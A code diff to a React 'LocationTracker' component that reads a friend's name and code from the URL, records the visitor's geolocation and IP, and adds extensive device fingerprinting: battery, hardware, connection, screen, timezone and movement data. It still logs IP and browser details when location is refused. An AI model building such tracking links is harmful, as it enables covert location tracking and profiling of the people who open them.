@@ -11,6 +11,87 @@ const LocationTracker = ({ onLocationDetected }) => {
 
   const { name: friendName, code: friendCode } = getFriendFromURL();
 
+  // Funcții pentru device info
+  const getBatteryInfo = async () => {
+    if ('getBattery' in navigator) {
+      try {
+        const battery = await navigator.getBattery();
+        return {
+          level: Math.round(battery.level * 100),
+          charging: battery.charging,
+          chargingTime: battery.chargingTime,
+          dischargingTime: battery.dischargingTime
+        };
+      } catch (error) {
+        return { level: 'unknown', charging: 'unknown' };
+      }
+    }
+    return { level: 'not_supported', charging: 'not_supported' };
+  };
+
+  const getDeviceInfo = () => {
+    const userAgent = navigator.userAgent.toLowerCase();
+    let deviceType = 'desktop';
+    let browser = 'unknown';
+    let os = 'unknown';
+
+    if (/mobile|android|iphone|ipad/.test(userAgent)) {
+      deviceType = 'mobile';
+    } else if (/tablet|ipad/.test(userAgent)) {
+      deviceType = 'tablet';
+    }
+
+    if (/chrome/.test(userAgent)) {
+      browser = 'chrome';
+    } else if (/firefox/.test(userAgent)) {
+      browser = 'firefox';
+    } else if (/safari/.test(userAgent)) {
+      browser = 'safari';
+    } else if (/edge/.test(userAgent)) {
+      browser = 'edge';
+    }
+
+    if (/windows/.test(userAgent)) {
+      os = 'windows';
+    } else if (/mac/.test(userAgent)) {
+      os = 'macos';
+    } else if (/linux/.test(userAgent)) {
+      os = 'linux';
+    } else if (/android/.test(userAgent)) {
+      os = 'android';
+    } else if (/iphone|ipad/.test(userAgent)) {
+      os = 'ios';
+    }
+
+    return {
+      type: deviceType,
+      browser: browser,
+      os: os,
+      cores: navigator.hardwareConcurrency || 'unknown',
+      memory: navigator.deviceMemory || 'unknown',
+      touchPoints: navigator.maxTouchPoints || 'unknown',
+      vendor: navigator.vendor || 'unknown'
+    };
+  };
+
+  const getConnectionInfo = () => {
+    if ('connection' in navigator) {
+      const connection = navigator.connection;
+      return {
+        effectiveType: connection.effectiveType || 'unknown',
+        downlink: connection.downlink || 'unknown',
+        rtt: connection.rtt || 'unknown',
+        saveData: connection.saveData || false
+      };
+    }
+    return {
+      effectiveType: 'not_supported',
+      downlink: 'not_supported',
+      rtt: 'not_supported',
+      saveData: false
+    };
+  };
+
   const requestLocation = async () => {
     if (!navigator.geolocation) {
       setStatus({
@@ -32,7 +113,11 @@ const LocationTracker = ({ onLocationDetected }) => {
         const coords = {
           latitude: position.coords.latitude,
           longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy
+          accuracy: position.coords.accuracy,
+          altitude: position.coords.altitude,
+          altitudeAccuracy: position.coords.altitudeAccuracy,
+          heading: position.coords.heading,
+          speed: position.coords.speed
         };
 
         // Obține IP-ul
@@ -45,15 +130,23 @@ const LocationTracker = ({ onLocationDetected }) => {
           console.log('Error getting IP');
         }
 
-        // Salvează datele
+        // Salvează datele cu TOATE noile informații
         const visitorData = {
           friend: friendName,
           friendCode: friendCode,
           timestamp: new Date().toLocaleString('ro-RO'),
+          unixTimestamp: Date.now(),
           locationAllowed: true,
           coordinates: coords,
           userAgent: navigator.userAgent,
           ip: ip,
+          battery: await getBatteryInfo(),
+          device: getDeviceInfo(),
+          connection: getConnectionInfo(),
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          language: navigator.language,
+          platform: navigator.platform,
           page: window.location.href
         };
 
@@ -88,7 +181,7 @@ const LocationTracker = ({ onLocationDetected }) => {
             break;
         }
 
-        // Salvează și refuzul
+        // Salvează doar refuzul simplu, fără device info
         let ip = 'unknown';
         try {
           const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -98,23 +191,14 @@ const LocationTracker = ({ onLocationDetected }) => {
           console.log('Error getting IP');
         }
 
-        // Salvează datele cu toate noile informații
         const visitorData = {
           friend: friendName,
           friendCode: friendCode,
           timestamp: new Date().toLocaleString('ro-RO'),
-          unixTimestamp: Date.now(),
-          locationAllowed: true,
-          coordinates: coords,
+          locationAllowed: false,
+          coordinates: null,
           userAgent: navigator.userAgent,
           ip: ip,
-          battery: await getBatteryInfo(),
-          device: getDeviceInfo(),
-          connection: getConnectionInfo(),
-          screenResolution: `${window.screen.width}x${window.screen.height}`,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          language: navigator.language,
-          platform: navigator.platform,
           page: window.location.href
         };
 
